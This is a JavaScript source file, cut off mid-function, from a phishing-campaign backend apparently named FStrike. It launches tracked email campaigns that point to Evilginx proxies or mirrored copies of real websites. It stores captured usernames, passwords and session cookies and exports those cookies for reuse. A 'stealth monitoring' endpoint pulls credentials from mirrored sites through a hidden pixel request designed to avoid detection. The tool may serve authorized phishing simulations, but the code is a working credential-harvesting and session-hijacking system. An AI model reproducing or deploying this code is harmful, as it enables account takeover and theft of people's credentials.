const db = require('../database');
const crypto = require('crypto');
const nodemailer = require('nodemailer');
const trackingService = require('../services/trackingService');
const landingPageService = require('../services/landingPageService');
const websiteMirroringService = require('../services/websiteMirroringService');
const config = require('../config');

const saveCampaign = (req, res) => {
  const {
    name,
    templateId,
    landingPageId,
    url,
    launchDate,
    sendByDate,
    profileId,
    groupId,
    useEvilginx,
    evilginxUrl,
    useWebsiteMirroring,
    mirrorTargetUrl
  } = req.body;

  // Debug: Log received data
  console.log('Received campaign data:', {
    name,
    templateId,
    landingPageId,
    url,
    launchDate,
    sendByDate,
    profileId,
    groupId,
    useEvilginx,
    evilginxUrl,
    useWebsiteMirroring,
    mirrorTargetUrl
  });

  // Validate required fields with specific error messages
  const requiredFields = [
    { field: name, name: 'name', label: 'Campaign name' },
    { field: templateId, name: 'templateId', label: 'Email template' },
    { field: url, name: 'url', label: 'URL' },
    { field: launchDate, name: 'launchDate', label: 'Launch date' },
    { field: profileId, name: 'profileId', label: 'Sending profile' },
    { field: groupId, name: 'groupId', label: 'Group' }
  ];

  for (const { field, name: fieldName, label } of requiredFields) {
    if (!field) {
      console.log(`Missing field: ${fieldName} (${label})`);
      return res.status(400).json({ error: `${label} is required.` });
    }
  }

  // Validate landing page options
  if (!landingPageId && !useEvilginx && !useWebsiteMirroring) {
    return res.status(400).json({ error: 'Landing page, Evilginx URL, or Website Mirroring must be selected.' });
  }

  if (useEvilginx && !evilginxUrl) {
    return res.status(400).json({ error: 'Evilginx URL is required when using Evilginx option.' });
  }

  if (useWebsiteMirroring && !mirrorTargetUrl) {
    return res.status(400).json({ error: 'Target URL is required when using Website Mirroring option.' });
  }

  const query = `
    INSERT INTO Campaigns (
      name, template_id, landing_page_id, url, 
      launch_date, send_by_date, profile_id, group_id,
      use_evilginx, evilginx_url, use_website_mirroring, mirror_target_url
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `;

  db.run(query, [
    name, templateId, landingPageId, url,
    launchDate, sendByDate, profileId, groupId,
    useEvilginx ? 1 : 0, evilginxUrl,
    useWebsiteMirroring ? 1 : 0, mirrorTargetUrl
  ], function(err) {
    if (err) {
      console.error('Error saving campaign:', err.message);
      return res.status(500).json({ error: 'Failed to save campaign.' });
    }
    res.json({
      message: 'Campaign saved successfully!',
      campaignId: this.lastID
    });
  });
};

const getCampaigns = (req, res) => {
  // First check if open_logs table exists
  db.get("SELECT name FROM sqlite_master WHERE type='table' AND name='open_logs'", [], (err, tableExists) => {
    if (err) {
      console.error('Error checking open_logs table:', err.message);
      return res.status(500).json({ error: 'Database error' });
    }
    
    // If table doesn't exist, create it
    if (!tableExists) {
      console.log('Creating open_logs table...');
      db.run(`
        CREATE TABLE open_logs (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          pixel_id TEXT NOT NULL,
          timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
          ip TEXT,
          userAgent TEXT
        )
      `, (createErr) => {
        if (createErr) {
          console.error('Error creating open_logs table:', createErr.message);
          return res.status(500).json({ error: 'Database error' });
        }
        
        // Table created, now check tracking_pixels table
        checkTrackingPixelsTable();
      });
    } else {
      // Table exists, check tracking_pixels table
      checkTrackingPixelsTable();
    }
  });
  
  function checkTrackingPixelsTable() {
    db.get("SELECT name FROM sqlite_master WHERE type='table' AND name='tracking_pixels'", [], (err, tableExists) => {
      if (err) {
        console.error('Error checking tracking_pixels table:', err.message);
        return res.status(500).json({ error: 'Database error' });
      }
      
      // If table doesn't exist, create it
      if (!tableExists) {
        console.log('Creating tracking_pixels table...');
        db.run(`
          CREATE TABLE tracking_pixels (
            id TEXT PRIMARY KEY,
            campaign_id INTEGER NOT NULL,
            user_email TEXT NOT NULL,
            createdAt DATETIME DEFAULT CURRENT_TIMESTAMP
          )
        `, (createErr) => {
          if (createErr) {
            console.error('Error creating tracking_pixels table:', createErr.message);
            return res.status(500).json({ error: 'Database error' });
          }
          
          // Table created, now run the main query
          runMainQuery();
        });
      } else {
        // Table exists, run the main query
        runMainQuery();
      }
    });
  }
  
  function runMainQuery() {
    const query = `
      SELECT 
        c.id,
        c.name,
        c.launch_date as launchDate,
        c.status,
        c.created_at as createdAt,
        t.template_name as templateName,
        l.page_name as landingPageName,
        p.name as profileName,
        g.group_name as groupName,
        COALESCE(
          (SELECT COUNT(*) 
           FROM open_logs ol
           JOIN tracking_pixels tp ON ol.pixel_id = tp.id 
           WHERE tp.campaign_id = c.id),
          0
        ) as opens
      FROM Campaigns c
      LEFT JOIN EmailTemplates t ON c.template_id = t.id
      LEFT JOIN LandingPages l ON c.landing_page_id = l.id
      LEFT JOIN SendingProfiles p ON c.profile_id = p.id
      LEFT JOIN UserGroups g ON c.group_id = g.id
      ORDER BY c.created_at DESC
    `;

    db.all(query, [], (err, rows) => {
      if (err) {
        console.error('Error fetching campaigns:', err.message);
        return res.status(500).json({ error: 'Failed to fetch campaigns.' });
      }
      res.json({ campaigns: rows });
    });
  }
};

const deleteCampaign = (req, res) => {
  const { id } = req.params;
  const query = `DELETE FROM Campaigns WHERE id = ?`;

  db.run(query, [id], function(err) {
    if (err) {
      console.error('Error deleting campaign:', err.message);
      return res.status(500).json({ error: 'Failed to delete campaign.' });
    }
    if (this.changes === 0) {
      return res.status(404).json({ error: 'Campaign not found.' });
    }
    res.json({ message: 'Campaign deleted successfully.' });
  });
};

const launchCampaign = async (req, res) => {
  const { id } = req.params;
  
  try {
    // 1. Get campaign data
    const campaign = await new Promise((resolve, reject) => {
      const query = `
        SELECT 
          c.*,
          e.envelope_sender,
          e.subject,
          e.html as emailHtml,
          e.text as emailText,
          e.add_tracking_image
        FROM Campaigns c
        JOIN EmailTemplates e ON c.template_id = e.id
        WHERE c.id = ?
      `;
      db.get(query, [id], (err, row) => {
        if (err) reject(err);
        if (!row) reject(new Error('Campaign not found'));
        resolve(row);
      });
    });

    // Check campaign status
    if (campaign.status === 'In Progress' || campaign.status === 'Sent') {
      return res.status(400).json({ error: `Campaign is already ${campaign.status.toLowerCase()}` });
    }

    // 2. Generate landing page URL, use evilginx URL, or create website mirror
    let landingPageUrl;
    try {
      if (campaign.use_website_mirroring) {
        // Create website mirroring session
        console.log(`Setting up website mirroring for: ${campaign.mirror_target_url} for campaign ${id}`);
        const mirrorSession = await websiteMirroringService.createMirrorSession(id, campaign.mirror_target_url);
        landingPageUrl = mirrorSession.proxyUrl;
        
        // Update campaign with mirror proxy port
        await new Promise((resolve, reject) => {
          db.run(
            `UPDATE Campaigns SET mirror_proxy_port = ? WHERE id = ?`,
            [mirrorSession.proxyPort, id],
            (err) => {
              if (err) reject(err);
              resolve();
            }
          );
        });
        
        console.log(`Website mirroring active: ${landingPageUrl} -> ${campaign.mirror_target_url}`);
      } else if (campaign.use_evilginx) {
        landingPageUrl = campaign.evilginx_url;
        console.log(`Using Evilginx URL: ${landingPageUrl} for campaign ${id}`);
      } else {
        landingPageUrl = await landingPageService.hostLandingPage(campaign.landing_page_id, id);
        console.log(`Generated landing page URL: ${landingPageUrl} for campaign ${id}`);
      }
    } catch (error) {
      console.error('Error setting up landing page URL:', error);
      return res.status(500).json({ error: 'Failed to set up landing page', details: error.message });
    }

    // 3. Get users from the targeted group
    const users = await new Promise((resolve, reject) => {
      db.all(
        `SELECT DISTINCT first_name, last_name, email, position 
         FROM GroupUsers 
         WHERE group_id = ?
         GROUP BY email`, // Ensure only one record per email
        [campaign.group_id], 
        (err, rows) => {
          if (err) reject(err);
          console.log(`Found ${rows.length} unique users in group ${campaign.group_id}`);
          resolve(rows);
        }
      );
    });

    if (users.length === 0) {
      return res.status(400).json({ error: 'No users found in the target group' });
    }

    console.log('Preparing to send emails to the following addresses:', users.map(u => u.email).join(', '));

    // 4. Get smtp settings from sending profile
    const profile = await new Promise((resolve, reject) => {
      db.get(`SELECT * FROM SendingProfiles WHERE id = ?`, [campaign.profile_id], (err, row) => {
        if (err) reject(err);
        if (!row) reject(new Error('Sending profile not found'));
        resolve(row);
      });
    });

    // 5. Set up transporter and send emails
    const transportOptions = {
      host: profile.host,
      port: 587, // Default SMTP port if not specified in the DB
      secure: false,
      auth: {
        user: profile.username,
        pass: profile.password
      }
    };
    
    if (profile.ignore_cert_errors) {
      transportOptions.tls = {
        rejectUnauthorized: false
      };
    }
    
    const transporter = nodemailer.createTransport(transportOptions);
    
    // Custom headers can be implemented later if needed
    const customHeaders = {};
    
    let successCount = 0;
    let errorCount = 0;
    const errors = [];
    
    // Modify the email HTML content to include the ngrok landing page URL
    let modifiedEmailHtml = landingPageService.injectLandingPageUrl(campaign.emailHtml, landingPageUrl);
    
    for (const user of users) {
      try {
        // Personalize email content
        const personalizedText = campaign.emailText
          ? campaign.emailText.replace(/\{name\}/g, user.first_name || '')
                           .replace(/\{email\}/g, user.email || '')
          : '';
        
        // Create a unique tracking ID for this recipient
        const trackingId = crypto.randomUUID();
        
        // Store tracking data directly in the database
        await new Promise((resolve, reject) => {
          db.run(
            `INSERT INTO tracking_pixels (id, campaign_id, user_email) VALUES (?, ?, ?)`, 
            [trackingId, id, user.email], 
            (err) => {
              if (err) reject(err);
              resolve();
            }
          );
        });

        // Modify the email HTML content with personalized URLs for this user
        let modifiedEmailHtml;
        
        // For website mirroring, we need personalized tracking in the URL
        if (campaign.use_website_mirroring) {
          modifiedEmailHtml = landingPageService.injectLandingPageUrl(
            campaign.emailHtml, 
            landingPageUrl, 
            trackingId  // Pass the unique tracking ID for personalizing the mirrored website link
          );
          console.log(`Personalized website mirroring URL with tracking ID ${trackingId} for ${user.email}`);
        } else {
          // For regular landing pages, we don't need to personalize the URL in the same way
          modifiedEmailHtml = landingPageService.injectLandingPageUrl(campaign.emailHtml, landingPageUrl);
        }

        // Add tracking web bug if enabled
        let finalHtmlContent = modifiedEmailHtml;
        if (campaign.add_tracking_image) {
          // Create single tracking pixel for better accuracy
          const webBug = `
            <!-- Mail tracking -->
            <div style="line-height:0;font-size:0;height:0">
              <img src="${config.trackingUrl}/tracker/${trackingId}.png?t=${Date.now()}" 
                   width="1" 
                   height="1" 
                   border="0"
                   style="height:1px!important;width:1px!important;border-width:0!important;margin:0!important;padding:0!important;display:block!important;overflow:hidden!important;opacity:0.99"
                   alt="" />
            </div>`;
            
          // Add the tracking pixel at the end of the email
          finalHtmlContent = `${finalHtmlContent}${webBug}`;
        }

        // Additional email headers to prevent caching
        const customHeaders = {
          'X-Entity-Ref-ID': trackingId,
          'Precedence': 'bulk',
          'X-Auto-Response-Suppress': 'OOF, AutoReply',
          'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
          'Pragma': 'no-cache',
          'Expires': '0'
        };

        // Send the email with mail options
        const mailOptions = {
          from: campaign.envelope_sender,
          to: user.email,
          subject: campaign.subject,
          text: personalizedText,
          html: finalHtmlContent,
          headers: customHeaders
        };

        // Send the email
        await transporter.sendMail(mailOptions);

        // Log detailed information about the email
        // console.log('========== EMAIL SENT DETAILS ==========');
        // console.log(`Recipient: ${user.email}`);
        // console.log(`Campaign: ${campaign.name} (ID: ${id})`);
        // console.log(`Tracking Pixel ID: ${trackingId}`);
        // console.log(`Tracking Pixel URL: ${await trackingService.generateTrackingUrl(trackingId)}`);
        // console.log(`Landing Page URL: ${landingPageUrl}`);
        // console.log('========================================');

        // Log email sent
        console.log(`Email sent to: ${user.email} for campaign: ${campaign.name} (ID: ${id})`);

        successCount++;
      } catch (err) {
        errorCount++;
        errors.push({ user: user.email, error: err.message });
        console.error(`Failed to send email to ${user.email}:`, err);
      }
    }

    // 6. Update campaign status
    await new Promise((resolve, reject) => {
      db.run(`
        UPDATE Campaigns
        SET status = 'In Progress',
            landing_page_url = ?
        WHERE id = ?
      `, [landingPageUrl, id], (err) => {
        if (err) reject(err);
        resolve();
      });
    });

    // 7. Return results
    return res.json({
      message: 'Campaign launched and in progress',
      landingPageUrl,
      totalEmails: users.length,
      successCount,
      errorCount,
      errors: errors.length > 0 ? errors : undefined
    });
  } catch (err) {
    console.error('Error launching campaign:', err.message);
    return res.status(500).json({ error: 'Failed to launch campaign', details: err.message });
  }
};

const closeCampaign = async (req, res) => {
  const { id } = req.params;
  
  try {
    // Get current campaign status
    const campaign = await new Promise((resolve, reject) => {
      db.get('SELECT status FROM Campaigns WHERE id = ?', [id], (err, row) => {
        if (err) reject(err);
        if (!row) reject(new Error('Campaign not found'));
        resolve(row);
      });
    });

    if (campaign.status !== 'In Progress') {
      return res.status(400).json({ error: 'Campaign is not in progress' });
    }

    // Update campaign status to Sent
    await new Promise((resolve, reject) => {
      db.run(`
        UPDATE Campaigns
        SET status = 'Sent'
        WHERE id = ?
      `, [id], (err) => {
        if (err) reject(err);
        resolve();
      });
    });

    return res.json({ message: 'Campaign closed successfully' });
  } catch (err) {
    console.error('Error closing campaign:', err.message);
    return res.status(500).json({ error: 'Failed to close campaign', details: err.message });
  }
};

const getCampaignLogs = async (req, res) => {
  const { id } = req.params;
  
  try {
    console.log(`Getting campaign logs for campaign ID: ${id}`);
    
    // 1. Verify campaign exists
    const campaign = await new Promise((resolve, reject) => {
      db.get('SELECT id, name FROM Campaigns WHERE id = ?', [id], (err, row) => {
        if (err) {
          console.error('Error fetching campaign:', err.message);
          reject(err);
        }
        if (!row) {
          console.error(`Campaign not found with id: ${id}`);
          reject(new Error('Campaign not found'));
        }
        resolve(row);
      });
    });

    console.log(`Campaign found: ${campaign.name} (ID: ${id})`);

    // 2. Get all tracking pixels for this campaign (sent emails) - check if table exists first
    let sentEmails = [];
    try {
      // Check if tracking_pixels table exists
      const trackingPixelsExists = await new Promise((resolve) => {
        db.get("SELECT name FROM sqlite_master WHERE type='table' AND name='tracking_pixels'", [], (err, row) => {
          resolve(!!row);
        });
      });
      
      if (trackingPixelsExists) {
        sentEmails = await new Promise((resolve, reject) => {
          db.all(
            `SELECT id, user_email, createdAt 
             FROM tracking_pixels
             WHERE campaign_id = ?
             ORDER BY createdAt DESC`,
            [id],
            (err, rows) => {
              if (err) {
                console.error('Error fetching tracking pixels:', err.message);
                reject(err);
              } else {
                resolve(rows || []);
              }
            }
          );
        });
        console.log(`Found ${sentEmails.length} sent emails for campaign ${id}`);
      } else {
        console.log('tracking_pixels table does not exist yet');
      }
    } catch (err) {
      console.error('Error fetching sent emails:', err.message);
      // Continue execution with empty array instead of failing
      sentEmails = [];
    }

    // 3. Get all opens for this campaign
    let openedEmails = [];
    try {
      openedEmails = await trackingService.getCampaignOpens(id);
      console.log(`Found ${openedEmails.length} opened emails for campaign ${id}`);
    } catch (err) {
      console.error('Error fetching email opens:', err.message);
      // Continue with empty array instead of failing
    }
    
    // 4. Get all link clicks for this campaign
    let linkClicks = [];
    try {
      linkClicks = await landingPageService.getCampaignClicks(id);
      console.log(`Found ${linkClicks.length} link clicks for campaign ${id}`);
    } catch (err) {
      console.error('Error fetching link clicks:', err.message);
      // Continue with empty array instead of failing
    }
    
    // 5. Calculate unique statistics and identify spam opens
    const uniqueOpenEmails = Array.from(new Set(openedEmails.map(item => item.email || '')));
    const totalUniqueOpens = uniqueOpenEmails.length;
    
    const uniqueClickIPs = Array.from(new Set(linkClicks.map(item => item.ip_address || '')));
    const totalUniqueClicks = uniqueClickIPs.length;

    // Calculate spam opens (opens within 5 seconds)
    const spamOpens = openedEmails.filter(open => {
      const sentEmail = sentEmails.find(sent => sent.user_email === open.email);
      if (!sentEmail) return false;
      
      try {
        const timeDiff = new Date(open.timestamp) - new Date(sentEmail.createdAt);
        return timeDiff <= 5000; // 5 seconds in milliseconds
      } catch (err) {
        console.error('Error calculating time difference:', err.message);
        return false;
      }
    });

    // Calculate legitimate opens
    const legitimateOpens = openedEmails.length - spamOpens.length;
    
    // Calculate percentages
    const legitimateOpenPercentage = openedEmails.length > 0 ? (legitimateOpens / openedEmails.length) * 100 : 0;
    const spamOpenPercentage = openedEmails.length > 0 ? (spamOpens.length / openedEmails.length) * 100 : 0;

    console.log('Successfully prepared campaign logs response');

    return res.json({
      campaign: campaign,
      sent: sentEmails.map(email => ({
        email: email.user_email,
        sentAt: email.createdAt
      })),
      opened: openedEmails.map(open => ({
        email: open.email || open.user_email,
        openedAt: open.timestamp,
        ip: open.ip,
        userAgent: open.userAgent,
        isSpam: spamOpens.some(spam => 
          spam.email === (open.email || open.user_email) && 
          spam.timestamp === open.timestamp
        )
      })),
      clicks: linkClicks.map(click => ({
        clickedAt: click.created_at,
        ip: click.ip_address,
        userAgent: click.user_agent
      })),
      stats: {
        totalSent: sentEmails.length,
        totalOpened: openedEmails.length,
        totalClicks: linkClicks.length,
        uniqueOpens: totalUniqueOpens,
        uniqueClicks: totalUniqueClicks,
        spamOpens: spamOpens.length,
        legitimateOpens: legitimateOpens,
        legitimateOpenPercentage: Math.round(legitimateOpenPercentage),
        spamOpenPercentage: Math.round(spamOpenPercentage)
      }
    });
  } catch (err) {
    console.error('Error getting campaign logs:', err.message);
    return res.status(500).json({ error: 'Failed to get campaign logs', details: err.message });
  }
};

/**
 * Get paginated form submissions for a campaign
 * @param {Object} req - Express request object
 * @param {Object} res - Express response object
 */
const getFormSubmissions = async (req, res) => {
  const { id } = req.params;
  const page = parseInt(req.query.page) || 1;
  const pageSize = parseInt(req.query.pageSize) || 3;
  
  console.log(`Getting form submissions for campaign ${id}, page ${page}, pageSize ${pageSize}`);
  
  try {
    // Verify campaign exists
    const campaign = await new Promise((resolve, reject) => {
      db.get('SELECT id, name FROM Campaigns WHERE id = ?', [id], (err, row) => {
        if (err) reject(err);
        if (!row) reject(new Error('Campaign not found'));
        console.log('Found campaign:', row);
        resolve(row);
      });
    });

    // Get form submissions for this campaign with pagination
    const formData = await landingPageService.getCampaignFormSubmissions(id, page, pageSize);
    console.log('Form submissions retrieved:', {
      totalCount: formData.totalCount,
      currentPage: formData.currentPage,
      totalPages: formData.totalPages,
      submissionCount: formData.submissions.length
    });
    
    return res.json({
      campaign: campaign,
      formData: formData
    });
  } catch (err) {
    console.error('Error getting form submissions:', err.message);
    return res.status(500).json({ error: 'Failed to get form submissions', details: err.message });
  }
};

// Website mirroring controller methods
const getMirrorSession = async (req, res) => {
  const { campaignId } = req.params;
  
  try {
    const session = await websiteMirroringService.getMirrorSession(campaignId);
    if (!session) {
      return res.status(404).json({ error: 'No active mirroring session found for this campaign' });
    }
    
    res.json({ session });
  } catch (err) {
    console.error('Error getting mirror session:', err.message);
    return res.status(500).json({ error: 'Failed to get mirror session', details: err.message });
  }
};

const stopMirrorSession = async (req, res) => {
  const { sessionId } = req.params;
  
  try {
    await websiteMirroringService.stopMirrorSession(parseInt(sessionId));
    res.json({ message: 'Mirror session stopped successfully' });
  } catch (err) {
    console.error('Error stopping mirror session:', err.message);
    return res.status(500).json({ error: 'Failed to stop mirror session', details: err.message });
  }
};

const trackMirrorView = async (req, res) => {
  const { sessionId } = req.params;
  
  try {
    // Track the mirror view
    await websiteMirroringService.trackAccess(parseInt(sessionId), req);
    
    // Return a 1x1 transparent pixel
    const pixel = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
      'base64'
    );
    
    res.writeHead(200, {
      'Content-Type': 'image/png',
      'Content-Length': pixel.length,
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      'Pragma': 'no-cache',
      'Expires': '0'
    });
    res.end(pixel);
  } catch (err) {
    console.error('Error tracking mirror view:', err.message);
    res.status(500).json({ error: 'Failed to track view' });
  }
};

/**
 * Get login attempts for a campaign
 * @param {Object} req - Express request object
 * @param {Object} res - Express response object
 */
const getLoginAttempts = async (req, res) => {
  const { id } = req.params;
  
  try {
    // Verify campaign exists
    const campaign = await new Promise((resolve, reject) => {
      db.get('SELECT id, name FROM Campaigns WHERE id = ?', [id], (err, row) => {
        if (err) reject(err);
        if (!row) reject(new Error('Campaign not found'));
        resolve(row);
      });
    });

    // Create login_attempts table if it doesn't exist
    await new Promise((resolve, reject) => {
      db.run(`
        CREATE TABLE IF NOT EXISTS login_attempts (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          campaign_id INTEGER NOT NULL,
          session_id TEXT NOT NULL,
          target_email TEXT NOT NULL,
          username TEXT,
          password TEXT,
          input_email TEXT,
          form_data TEXT,
          url TEXT,
          ip_address TEXT,
          user_agent TEXT,
          cookies TEXT,
          timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
          has_cookies INTEGER DEFAULT 0
        )
      `, (err) => {
        if (err) reject(err);
        else resolve();
      });
    });

    // Get login attempts for this campaign
    const loginAttempts = await new Promise((resolve, reject) => {
      db.all(
        `SELECT * FROM login_attempts WHERE campaign_id = ? ORDER BY timestamp DESC`,
        [id],
        (err, rows) => {
          if (err) reject(err);
          else resolve(rows || []);
        }
      );
    });

    console.log(`Found ${loginAttempts.length} login attempts for campaign ${id}`);

    // Also get any credentials from captured_credentials table that might not be in login_attempts
    const capturedCredentials = await new Promise((resolve, reject) => {
      db.all(
        `SELECT * FROM captured_credentials WHERE campaign_id = ? ORDER BY created_at DESC`,
        [id],
        (err, rows) => {
          if (err) reject(err);
          else resolve(rows || []);
        }
      );
    });

    console.log(`Found ${capturedCredentials.length} additional captured credentials for campaign ${id}`);
    
    // Format the login attempts for response
    const formattedAttempts = loginAttempts.map(attempt => {
      // Parse cookies if present
      let cookies = [];
      if (attempt.cookies) {
        try {
          // First try to parse as JSON
          let parsedCookies = JSON.parse(attempt.cookies);
          
          // Ensure cookies are in the required detailed format
          if (Array.isArray(parsedCookies)) {
            cookies = parsedCookies.map(cookie => {
              // If cookie doesn't have all the required fields, add them
              if (!cookie.name || !cookie.domain) {
                const host = attempt.url ? new URL(attempt.url).hostname : 'unknown';
                
                return {
                  domain: cookie.domain || host,
                  expirationDate: cookie.expirationDate || null,
                  hostOnly: cookie.hostOnly || true,
                  httpOnly: cookie.httpOnly || false,
                  name: cookie.name || 'unknown',
                  path: cookie.path || '/',
                  sameSite: cookie.sameSite || null,
                  secure: cookie.secure || false,
                  session: cookie.session || true,
                  storeId: cookie.storeId || null,
                  value: cookie.value || ''
                };
              }
              return cookie;
            });
          } else if (typeof parsedCookies === 'object') {
            // Handle case where cookies are stored as an object instead of array
            cookies = Object.entries(parsedCookies).map(([name, value]) => {
              const host = attempt.url ? new URL(attempt.url).hostname : 'unknown';
              return {
                domain: host,
                expirationDate: null,
                hostOnly: true,
                httpOnly: false,
                name,
                path: '/',
                sameSite: null,
                secure: false,
                session: true,
                storeId: null,
                value
              };
            });
          }
        } catch (e) {
          console.error('Error parsing cookies:', e);
        }
      }

      // Parse form data if present
      let formData = {};
      let formFields = [];
      if (attempt.form_data) {
        try {
          formData = JSON.parse(attempt.form_data);
          
          // Extract form fields for display
          if (formData && typeof formData === 'object') {
            // Check if formData itself is the form fields
            if (formData.formData && typeof formData.formData === 'string') {
              try {
                const parsedFormData = JSON.parse(formData.formData);
                formFields = Object.entries(parsedFormData).map(([key, value]) => ({
                  name: key,
                  value: value
                }));
              } catch (e) {
                console.error('Error parsing nested formData:', e);
              }
            } else {
              // Direct form fields in the object
              formFields = Object.entries(formData).map(([key, value]) => ({
                name: key,
                value: value
              }));
            }
          }
        } catch (e) {
          console.error('Error parsing form data:', e);
        }
      }

      return {
        id: attempt.id,
        targetEmail: attempt.target_email,
        timestamp: attempt.timestamp,
        username: attempt.username,
        password: attempt.password,
        inputEmail: attempt.input_email,
        url: attempt.url,
        ipAddress: attempt.ip_address,
        userAgent: attempt.user_agent,
        hasCookies: attempt.has_cookies === 1,
        cookiesCount: cookies.length,
        cookies: cookies,
        formData: formData,
        formFields: formFields
      };
    });

    // Format any additional captured credentials
    const additionalCredentials = capturedCredentials.map(cred => {
      let formFields = [];
      let otherFields = {};
      
      if (cred.other_fields) {
        try {
          otherFields = JSON.parse(cred.other_fields);
          
          if (otherFields && typeof otherFields === 'object') {
            formFields = Object.entries(otherFields).map(([key, value]) => ({
              name: key,
              value: value
            }));
          }
        } catch (e) {
          console.error('Error parsing other_fields:', e);
        }
      }

      return {
        id: `cred-${cred.id}`, // Add prefix to distinguish from login attempts
        targetEmail: "Unknown", // Usually not linked to specific email
        timestamp: cred.created_at,
        username: cred.username,
        password: cred.password,
        inputEmail: null,
        url: cred.url,
        ipAddress: cred.ip_address,
        userAgent: cred.user_agent,
        hasCookies: false,
        cookiesCount: 0,
        cookies: [],
        formData: otherFields,
        formFields: formFields,
        captureMethod: cred.capture_method || 'form_submission'
      };
    });

    // Combine both sources, with login attempts first
    const allCredentials = [...formattedAttempts, ...additionalCredentials];

    return res.json({
      campaign: campaign,
      loginAttempts: allCredentials
    });
  } catch (err) {
    console.error('Error getting login attempts:', err.message);
    return res.status(500).json({ error: 'Failed to get login attempts', details: err.message });
  }
};

/**
 * Download cookies for a specific login attempt
 * @param {Object} req - Express request object
 * @param {Object} res - Express response object
 */
const downloadCookies = async (req, res) => {
  const { id } = req.params;
  
  try {
    // Get login attempt
    const loginAttempt = await new Promise((resolve, reject) => {
      db.get('SELECT * FROM login_attempts WHERE id = ?', [id], (err, row) => {
        if (err) reject(err);
        if (!row) reject(new Error('Login attempt not found'));
        resolve(row);
      });
    });

    if (!loginAttempt.cookies) {
      return res.status(404).json({ error: 'No cookies found for this login attempt' });
    }

    // Parse cookies
    let cookies;
    try {
      cookies = JSON.parse(loginAttempt.cookies);
    } catch (e) {
      console.error('Error parsing cookies:', e);
      return res.status(500).json({ error: 'Error parsing cookies data' });
    }

    if (!cookies || !Array.isArray(cookies) || cookies.length === 0) {
      return res.status(404).json({ error: 'No cookies found for this login attempt' });
    }

    // Format cookies in the specified detailed JSON format
    const formattedCookies = cookies.map(cookie => {
      // Ensure all required fields are present
      const host = loginAttempt.url ? new URL(loginAttempt.url).hostname : 'unknown';
      
      return {
        domain: cookie.domain || host,
        expirationDate: cookie.expirationDate || Math.floor(new Date().setFullYear(new Date().getFullYear() + 1) / 1000),
        hostOnly: typeof cookie.hostOnly === 'boolean' ? cookie.hostOnly : true,
        httpOnly: typeof cookie.httpOnly === 'boolean' ? cookie.httpOnly : false,
        name: cookie.name || 'unknown',
        path: cookie.path || '/',
        sameSite: cookie.sameSite || null,
        secure: typeof cookie.secure === 'boolean' ? cookie.secure : false,
        session: typeof cookie.session === 'boolean' ? cookie.session : true,
        storeId: cookie.storeId || null,
        value: cookie.value || ''
      };
    });

    // Format determines the output format (json or netscape)
    const format = req.query.format || 'json';

    if (format === 'netscape') {
      // Format cookies for download - Netscape format (for curl, wget, etc.)
      let cookieFileContent = '# Netscape HTTP Cookie File\n';
      cookieFileContent += '# https://curl.se/docs/http-cookies.html\n';
      cookieFileContent += '# This file was generated by FStrike. Edit at your own risk.\n\n';

      // Add the cookies in a format compatible with curl and other tools
      formattedCookies.forEach(cookie => {
        try {
          if (!cookie.name || !cookie.value) return;
          
          const domain = cookie.domain;
          const path = cookie.path || '/';
          const secure = cookie.secure ? 'TRUE' : 'FALSE';
          const expires = cookie.expirationDate || Math.floor(new Date().setFullYear(new Date().getFullYear() + 1) / 1000);
          
          cookieFileContent += `${domain}\tTRUE\t${path}\t${secure}\t${expires}\t${cookie.name}\t${cookie.value}\n`;
        } catch (e) {
          console.error('Error formatting cookie:', e);
        }
      });

      // Set response headers for file download
      res.setHeader('Content-Type', 'text/plain');
      res.setHeader('Content-Disposition', `attachment; filename="cookies_${id}.txt"`);
      
      return res.send(cookieFileContent);
    } else {
      // Set response headers for JSON format
      res.setHeader('Content-Type', 'application/json');
      res.setHeader('Content-Disposition', `attachment; filename="cookies_${id}.json"`);
      
      // Return the cookies as JSON array
      return res.send(JSON.stringify(formattedCookies, null, 2));
    }
  } catch (err) {
    console.error('Error downloading cookies:', err.message);
    return res.status(500).json({ error: 'Failed to download cookies', details: err.message });
  }
};

/**
 * Handle stealth monitoring data from mirrored websites
 * @param {Object} req - Express request object
 * @param {Object} res - Express response object
 */
const handleProxyMonitor = async (req, res) => {
  const { sessionToken } = req.params;
  
  try {
    // Return a 1x1 transparent pixel to avoid detection
    const pixel = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
      'base64'
    );
    
    // Extract monitoring data from query parameters (stealth mode)
    const monitoringData = {
      data: req.query.data ? JSON.parse(decodeURIComponent(req.query.data)) : null,
      url: req.query.url ? decodeURIComponent(req.query.url) : null,
      type: req.query.type || 'form',
      field: req.query.field ? decodeURIComponent(req.query.field) : null,
      value: req.query.value ? decodeURIComponent(req.query.value) : null,
      timestamp: new Date().toISOString(),
      ip: req.ip,
      userAgent: req.get('User-Agent')
    };
    
    console.log(`🕵️ Stealth monitoring data received for session ${sessionToken}:`, monitoringData);
    
    // Store in database for analysis
    if (monitoringData.data && Object.keys(monitoringData.data).length > 0) {
      // Check if this contains credentials
      const credentials = websiteMirroringService.extractCredentials(monitoringData.data);
      
      if (credentials && Object.keys(credentials).length > 0) {
        console.log('🔑 STEALTH CREDENTIALS CAPTURED:', JSON.stringify(credentials));
        
        // Store in captured_credentials table
        db.run(
          `INSERT INTO captured_credentials (campaign_id, url, username, password, other_fields, ip_address, user_agent, capture_method)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
          [
            0, // Will be updated with actual campaign ID if available
            monitoringData.url || 'unknown',
            credentials.username || credentials.email || null,
            credentials.password || null,
            JSON.stringify(monitoringData),
            req.ip,
            req.get('User-Agent'),
            'stealth_monitoring'
          ],
          function(err) {
            if (err) console.error('Error storing stealth credentials:', err);
            else console.log('💾 Stealth credentials stored with ID:', this.lastID);
          }
        );
      }
    }
    
    res.writeHead(200, {
      'Content-Type': 'image/png',
      'Content-Length': pixel.length,
